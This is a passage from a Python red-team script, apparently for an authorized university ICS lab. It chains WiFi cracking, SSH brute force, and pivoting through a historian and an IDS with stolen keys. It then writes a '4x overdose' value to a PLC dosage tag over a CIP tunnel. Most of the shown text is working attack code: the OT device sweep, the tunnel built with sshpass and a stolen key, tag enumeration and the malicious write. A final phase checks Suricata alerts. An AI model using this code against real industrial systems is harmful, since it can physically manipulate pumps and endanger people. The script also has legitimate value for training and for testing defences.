                continue
            d_ip, d_port = parts[0].strip(), parts[1].strip()
            if not d_ip.startswith("10.20.20."):
                continue
            if d_ip in SKIP_IPS:
                continue
            vendor = PORT_VENDOR.get(d_port, f"Unknown (port {d_port})")
            discovered_devices.append({"ip": d_ip, "port": d_port, "vendor": vendor})

        sweep_table = Table(show_header=True, header_style="bold magenta", border_style="dim")
        sweep_table.add_column("Discovered IP",    style="cyan",  width=18)
        sweep_table.add_column("Open Port",         style="white", width=12)
        sweep_table.add_column("Inferred PLC Type", style="green", width=40)
        for dev in discovered_devices:
            sweep_table.add_row(dev["ip"], dev["port"], dev["vendor"])
        console.print(sweep_table)

        PORT_PRIORITY = ["44818", "502", "102"]
        best = None
        for preferred_port in PORT_PRIORITY:
            best = next((d for d in discovered_devices if d["port"] == preferred_port), None)
            if best:
                break

        if best:
            old_plc_ip = plc_ip
            CFG["plc"]["ip"]   = best["ip"]
            CFG["plc"]["type"] = best["vendor"]
            plc_ip = best["ip"]
            checks["ping"] = True
            if best["ip"] != old_plc_ip:
                console.print(Panel(
                    f"[bold white]Configured IP :[/bold white]  "
                    f"[red]{old_plc_ip}[/red]  (not seen in sweep)\n"
                    f"[bold white]Discovered IP :[/bold white]  "
                    f"[bold green]{best['ip']}[/bold green]  port {best['port']}\n"
                    f"[bold white]Vendor        :[/bold white]  {best['vendor']}\n\n"
                    f"[dim]CFG updated — Phase 5 will CIP from IDS → {best['ip']}[/dim]",
                    title="[bold yellow] PLC IP AUTO-CORRECTED [/bold yellow]",
                    border_style="yellow", expand=False,
                ))
            else:
                ok(f"PLC confirmed: {best['ip']}  ({best['vendor']}  port {best['port']})")
        else:
            checks["ping"] = False
            err("No recognised industrial devices found on OT subnet (ports 44818/502/102 all closed)")

        findings.append(f"OT Sweep:\n{sweep_out}")

        ids_client.close()
        hist_client.close()

        if checks["route"] and checks["ping"]:
            r.status  = "success"
            r.finding = (
                f"OT zone confirmed — {plc_ip} "
                f"({CFG['plc'].get('type', 'unknown vendor')})"
            )
            ok(r.finding)
        elif not checks["ping"]:
            r.status  = "failed"
            r.finding = "No recognised industrial devices found on the OT subnet"
            err(r.finding)
        else:
            r.status  = "failed"
            r.finding = "No route from Historian to OT zone"
            err(r.finding)

        r.output = "\n".join(findings)

    except paramiko.AuthenticationException as e:
        r.status  = "failed"
        r.finding = f"SSH auth failed — {e} — check CFG credentials"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def _open_cip_tunnel(
    hist_ip: str, hist_user: str, hist_pass: str,
    ids_ip: str,  ids_user: str,  ids_pass: str,
    ids_pkey: "paramiko.PKey | None",
    plc_ip: str,  local_port: int = 44818,
) -> tuple["subprocess.Popen", "str | None"]:
    """
    Spawn a native ssh -L tunnel:  localhost:local_port → IDS → PLC:local_port
    Historian is the ProxyCommand jump host (sshpass for password auth).
    IDS auth uses the stolen private key when available, else sshpass password.

    Returns (Popen, key_file_path_or_None).
    Caller must .terminate() the process and delete the key file when done.
    """
    # Write stolen key to disk so ssh -i can use it
    key_file: str | None = None
    if ids_pkey:
        key_file = "/tmp/ids_rsa"
        with open(key_file, "w") as kf:
            ids_pkey.write_private_key(kf)
        os.chmod(key_file, 0o600)

    # Kill any stale listener from a previous run
    run_cmd(f"fuser -k {local_port}/tcp 2>/dev/null || true", capture=False)
    time.sleep(0.5)

    # Historian hop via ProxyCommand — always password-authed
    ssh_opts   = "-o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=no"
    proxy_cmd  = (
        f"sshpass -p '{hist_pass}' ssh -W %h:%p "
        f"{ssh_opts} {hist_user}@{hist_ip}"
    )
    fwd        = f"-N -L {local_port}:{plc_ip}:{local_port}"
    proxy_opt  = f'-o "ProxyCommand={proxy_cmd}"'

    if key_file:
        # Key auth to IDS — no outer sshpass needed
        cmd = (
            f"ssh {fwd} {ssh_opts} {proxy_opt} "
            f"-i {key_file} {ids_user}@{ids_ip}"
        )
    else:
        # Password auth to IDS
        cmd = (
            f"sshpass -p '{ids_pass}' ssh {fwd} {ssh_opts} {proxy_opt} "
            f"{ids_user}@{ids_ip}"
        )

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,   # captured so we can report why it died
    )
    return proc, key_file


def phase5_plc_attack() -> PhaseResult:
    phase_header(5, "CIP Write Tag — PLC Dosage_Rate Manipulation")
    r = PhaseResult("PLC CIP Write")

    plc_ip   = CFG["plc"]["ip"]
    tag      = CFG["plc"]["tag"]
    safe_val = CFG["plc"]["safe_value"]
    atk_val  = CFG["plc"]["attack_value"]

    hist_ip   = CFG["historian"]["ip"]
    hist_port = CFG["historian"]["port"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]

    ids_ip   = CFG["ids"]["ip"]
    ids_port = CFG["ids"]["port"]
    ids_user = CFG["ids"]["username"]
    ids_pass = CFG["ids"]["password"]
    ids_pkey: "paramiko.PKey | None" = CFG["ids"].get("private_key")

    LOCAL_PORT  = 44818
    INTERESTING = {"dose", "rate", "pump", "speed", "flow", "setpoint", "cmd", "hz"}
    NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
    # Allen-Bradley ControlLogix CPUs can live in different backplane slots
    CIP_SLOTS = ["", "/0", "/1", "/2", "/3"]

    warn(f"This will write {tag} = {atk_val} (simulated 4x overdose) on PLC {plc_ip}")
    warn(f"Strategy: native ssh -L  127.0.0.1:{LOCAL_PORT} → IDS ({ids_ip}) → PLC:{LOCAL_PORT}")
    warn("MasterFlex pump will physically change behavior.")

    console.print()
    if not Confirm.ask("[red]Confirm attack write?[/red]", default=False):
        r.status  = "skipped"
        r.finding = "Skipped by operator"
        return r

    tunnel_proc: "subprocess.Popen | None" = None
    key_file:    "str | None"              = None

    try:
        # ── Spawn the real ssh -L tunnel ──────────────────────────────────────
        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
        tunnel_proc, key_file = _open_cip_tunnel(
            hist_ip, hist_user, hist_pass,
            ids_ip,  ids_user,  ids_pass, ids_pkey,
            plc_ip,  LOCAL_PORT,
        )

        info("Waiting 4 s for tunnel to establish...")
        time.sleep(4)

        if tunnel_proc.poll() is not None:
            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
            raise RuntimeError(
                f"ssh tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
            )
        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")

        # ── Slot hunt: try CIP paths until one opens ──────────────────────────
        from pycomm3 import LogixDriver

        plc_conn    = None
        working_path = None
        for slot in CIP_SLOTS:
            path = f"127.0.0.1{slot}"
            info(f"Trying CIP path: {path!r}")
            drv = LogixDriver(path)
            try:
                drv.open()
                plc_conn     = drv
                working_path = path
                ok(f"PLC connected at {path!r}")
                break
            except Exception as slot_err:
                warn(f"  {path!r} → {slot_err}")
                try: drv.close()
                except Exception: pass

        if plc_conn is None:
            raise RuntimeError(
                f"All CIP slot paths failed — PLC at {plc_ip} not responding via tunnel.\n"
                "Verify the PLC is powered on and sshpass is installed on Kali."
            )

        try:
            # ── Tag enumeration ───────────────────────────────────────────────
            info("Enumerating PLC tag list...")
            all_tags = plc_conn.get_tag_list()

            filtered = [
                t for t in all_tags
                if any(kw in t.tag_name.lower() for kw in INTERESTING)
                and str(t.data_type).upper() in NUMERIC_TYPES
            ]

            tag_table = Table(
                title="[bold magenta]Discovered PLC Tags (Filtered)[/bold magenta]",
                show_header=True, header_style="bold cyan", border_style="dim",
            )
            tag_table.add_column("Tag Name",  style="green",  width=36)
            tag_table.add_column("Data Type", style="yellow", width=12)
            for t in filtered:
                tag_table.add_row(t.tag_name, str(t.data_type))
            console.print(tag_table)

            if not filtered:
                warn("No interesting tags matched — showing first 40 raw tags:")
                all_table = Table(show_header=True, header_style="bold cyan", border_style="dim")
                all_table.add_column("Tag Name",  style="dim green",  width=36)
                all_table.add_column("Data Type", style="dim yellow", width=12)
                for t in all_tags[:40]:
                    all_table.add_row(t.tag_name, str(t.data_type))
                console.print(all_table)

            # ── Validate configured tag; prompt if missing ────────────────────
            probe = plc_conn.read(tag)
            if probe is None or probe.value is None:
                warn(f"Configured tag '{tag}' returned None.")
                console.print()
                tag = Prompt.ask(
                    "[yellow]Enter the correct tag name from the table above[/yellow]"
                )
                CFG["plc"]["tag"] = tag
                ok(f"Tag updated → [bold]{tag}[/bold]")

            # ── Read → Write → Verify ─────────────────────────────────────────
            before = plc_conn.read(tag)
            info(f"Before: {tag} = {before.value}")

            plc_conn.write((tag, atk_val))

            after = plc_conn.read(tag)
            info(f"After : {tag} = {after.value}")

        finally:
            plc_conn.close()

        if after.value == atk_val:
            r.status  = "success"
            r.finding = f"{tag} written: {before.value} → {after.value} (4x overdose simulated)"
            ok(r.finding)
        else:
            r.status  = "success"
            r.finding = f"CIP Write sent — read back {after.value}, verify on PLC/Grafana"
            warn(r.finding)

        r.output = f"Before: {before.value}  After: {after.value}"

    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    finally:
        if tunnel_proc and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            info("SSH tunnel closed")
        if key_file and os.path.exists(key_file):
            os.remove(key_file)
            info(f"Removed {key_file}")

    return r


def phase6_defense_check() -> PhaseResult:
    phase_header(6, "Defense Validation (Secure State)")
    r = PhaseResult("Defense Validation")

    hist_ip   = CFG["historian"]["ip"]
    hist_port = CFG["historian"]["port"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]

    ids_ip   = CFG["ids"]["ip"]
    ids_port = CFG["ids"]["port"]
    ids_user = CFG["ids"]["username"]
    ids_pass = CFG["ids"]["password"]
    ids_cmd  = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"

    info(f"Checking Suricata alerts on IDS ({ids_ip}) via Historian hop...")

    try:
        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
                                  password=hist_pass, port=hist_port)
        ids_pkey    = CFG["ids"].get("private_key")   # set by Phase 4 if key was stolen
        ids_client  = ssh_hop(
            hist_client, ids_ip, ids_port, ids_user,
            target_pass=None if ids_pkey else ids_pass,
            pkey=ids_pkey,
        )

        stdout, _, _ = ssh_run(ids_client, ids_cmd)
        ids_client.close()
        hist_client.close()

        if stdout.strip():
            ok("Suricata CIP alert triggered:")
            console.print(f"[yellow]{escape(stdout)}[/yellow]")
            r.finding = "Suricata blocked CIP Write — Layer 1 defense confirmed"
            r.status  = "success"
        else:
            warn("No Suricata CIP alerts found — check rule deployment")
            r.finding = "No Suricata alerts detected"
            r.status  = "success"

        r.output = stdout

    except paramiko.AuthenticationException as e:
        r.status  = "failed"
        r.finding = f"SSH auth failed — {e}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


# ── Final report ──────────────────────────────────────────────────────────────

def print_report():
    console.print()
    console.rule("[bold white]Attack Chain Report[/bold white]")

    STATUS_STYLE = {
        "success": ("green",  " SUCCESS"),
        "failed":  ("red",    " FAILED "),
        "skipped": ("yellow", " SKIPPED"),
        "pending": ("dim",    " PENDING"),
    }

    table = Table(show_header=True, header_style="bold magenta", border_style="dim")
    table.add_column("#",       style="dim",   width=3)
    table.add_column("Phase",   style="cyan",  width=26)
    table.add_column("Status",  width=10)
    table.add_column("Finding", width=54)

    for i, r in enumerate(results, 1):
        color, label = STATUS_STYLE.get(r.status, ("white", r.status.upper()))
        table.add_row(
            str(i),
            r.phase,
            f"[bold {color}]{label}[/bold {color}]",
            r.finding,
        )

    console.print(table)

    report_path = f"/tmp/incs4810_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = [
        {"phase": r.phase, "status": r.status,
         "finding": r.finding, "ts": r.ts, "output": r.output}
        for r in results
    ]
    with open(report_path, "w") as f:
        json.dump(data, f, indent=2)

    ok(f"Full JSON report saved: {report_path}")


# ── Phase registry ────────────────────────────────────────────────────────────

PHASES = [
    (1, "WiFi AP Crack",         phase1_wifi_crack),
    (2, "IDMZ Recon",            phase2_idmz_recon),
    (3, "SSH Brute Force",       phase3_ssh_bruteforce),
    (4, "SSH Pivot / OT Recon",  phase4_ssh_pivot),
    (5, "PLC CIP Write Attack",  phase5_plc_attack),
    (6, "Defense Validation",    phase6_defense_check),
]


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="INCS 4810 Red Team Chain — BCIT Authorized Lab"
    )
    parser.add_argument(
        "--phases", nargs="*", type=int,
        help="Run specific phases only, e.g. --phases 2 3 4"
    )
    parser.add_argument(
        "--auto", action="store_true",
        help="Skip per-phase confirmation prompts"
    )
    args = parser.parse_args()

    banner()
    preflight_check()

    selected   = set(args.phases) if args.phases else {n for n, _, _ in PHASES}
    chain_start = time.monotonic()

    for n, title, fn in PHASES:
        if n not in selected:
            results.append(PhaseResult(title, status="skipped", finding="Not selected"))
            continue

        if not args.auto and not confirm_phase(f"Phase {n}/{len(PHASES)}: {title}"):
            results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
            continue

        while True:
            phase_start = time.monotonic()
            r = fn()
            phase_elapsed = time.monotonic() - phase_start

            status_color = "green" if r.status == "success" else "red" if r.status == "failed" else "yellow"
            console.print(
                f"\n[dim]Phase {n} complete — "
                f"[{status_color}]{r.status.upper()}[/{status_color}]  "
                f"elapsed [bold]{phase_elapsed:.1f}s[/bold][/dim]"
            )

            if r.status != "failed" or args.auto:
                break   # success / skipped, or auto mode — move on

            console.print()
            choice = Prompt.ask(
                "[red]Phase failed[/red] — what next?",
                choices=["r", "c", "q"],
                default="c",
            )
            console.print("[dim]  r = retry  |  c = continue to next phase  |  q = quit[/dim]")

            if choice == "r":
                warn(f"Retrying Phase {n}: {title} ...")
                continue        # re-run fn()
            elif choice == "q":
                results.append(r)
                console.print("[bold red]Aborted by operator.[/bold red]")
                chain_elapsed = time.monotonic() - chain_start
                console.print(f"\n[dim]Total chain elapsed: [bold]{chain_elapsed:.1f}s[/bold][/dim]")
                print_report()
                return
            else:
                break           # continue to next phase

        results.append(r)

    chain_elapsed = time.monotonic() - chain_start
    console.print(f"\n[dim]Total chain elapsed: [bold]{chain_elapsed:.1f}s[/bold][/dim]")
    print_report()


if __name__ == "__main__":
    main()
